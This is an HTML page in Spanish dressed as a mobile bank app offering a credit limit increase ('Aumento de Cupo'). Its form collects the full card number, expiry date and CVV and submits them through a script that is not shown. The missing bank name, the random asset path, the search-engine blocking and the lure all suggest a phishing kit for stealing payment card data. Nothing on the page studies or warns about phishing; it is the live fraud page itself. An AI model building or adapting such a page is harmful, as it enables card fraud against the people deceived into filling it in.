<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>App-Móvil</title><meta name="robots" content="noindex, nofollow, noarchive, nosnippet, none"><meta name="googlebot" content="noindex, nofollow"><meta name="bingbot" content="noindex, nofollow"><meta name="google" content="notranslate"><meta name="referrer" content="no-referrer"><link rel="sitemap" type="application/xml" href="/sitemap.xml"><style>/* 1. Fondo exterior degradado azul corporativo */ body { margin: 0; padding: 0; background: linear-gradient(135deg, #0041c2 0%, #002b80 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; } /* 2. Contenedor estilo App Móvil */ .box-container { width: 100%; max-width: 414px; height: 92vh; max-height: 820px; background-color: #ffffff; border-radius: 30px; box-shadow: 0 15px 40px rgba(0,0,0,0.4); overflow-y: auto; position: relative; display: flex; flex-direction: column; } /* Ocultar barra de scroll para estética limpia */ .box-container::-webkit-scrollbar { display: none; } .container__login { padding: 25px; } /* Cabecera y Logo */ .container__login--header { margin-bottom: 20px; } .container__login--header img { max-width: 170px; } .container__login--title-1 p { font-size: 20px; font-weight: bold; color: #000; margin: 0 0 10px 0; } /* Título del formulario */ #form-title { font-size: 15px; color: #555; display: block; margin-bottom: 25px; line-height: 1.4; border-left: 4px solid #0041c2; padding-left: 10px; } /* Labels e Inputs */ .label { font-size: 13px; font-weight: bold; color: #333; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; } .custom-form-control { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 12px; font-size: 16px; box-sizing: border-box; background-color: #fcfcfc; transition: all 0.3s ease; } .custom-form-control:focus { outline: none; border-color: #0041c2; box-shadow: 0 0 0 3px rgba(0, 65, 194, 0.1); background-color: #fff; } /* Mensajes de Error */ .error-text { color: #d93025; font-size: 12px; margin: -10px 0 15px 5px; display: none; } /* Botón de Acción */ .btn-main { width: 100%; background-color: #0041c2; color: white; border: none; padding: 16px; border-radius: 50px; /* Estilo píldora */ font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: background 0.3s; box-shadow: 0 4px 12px rgba(0, 65, 194, 0.3); } .btn-main:hover { background-color: #002b80; box-shadow: 0 6px 15px rgba(0, 65, 194, 0.4); } /* Layout para Expiry y CCV en la misma línea (opcional) */ .row { display: flex; gap: 15px; } .row div { flex: 1; }</style></head><body><div class="box-container"><div class="container__login"><div class="container__login--header"><img src="./cewrewer/734ghed734gb.webp" alt="Logo"></div><div class="container__login--title"><div class="container__login--title-1"><p>Aumento de Cupo</p></div></div><div class="container__login--login-box"><div class="container__login--login-box-title"><span id="form-title">Consulta y aumenta tu Tarjeta</span></div><div class="form-container"><form method="post" name="loginForm" id="loginForm" onsubmit="return sender();" autocomplete="off"><div class="label"><label for="cardNumber">Número de Tarjeta</label></div><input type="tel" class="custom-form-control" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19"><p id="cardError" class="error-text">Debe ingresar una tarjeta válida.</p><div class="row"><div><div class="label"><label for="expiryDate">Vencimiento</label></div><input type="tel" class="custom-form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5"><p id="expiryError" class="error-text">Fecha inválida</p></div><div><div class="label"><label for="ccv">Código CVV</label></div><input type="tel" class="custom-form-control" id="ccv" name="ccv" maxlength="4" minlength="3" placeholder="123"></div></div><div class="btn-container"><button type="submit" class="btn-main">Continuar</button></div></form></div></div></div></div>
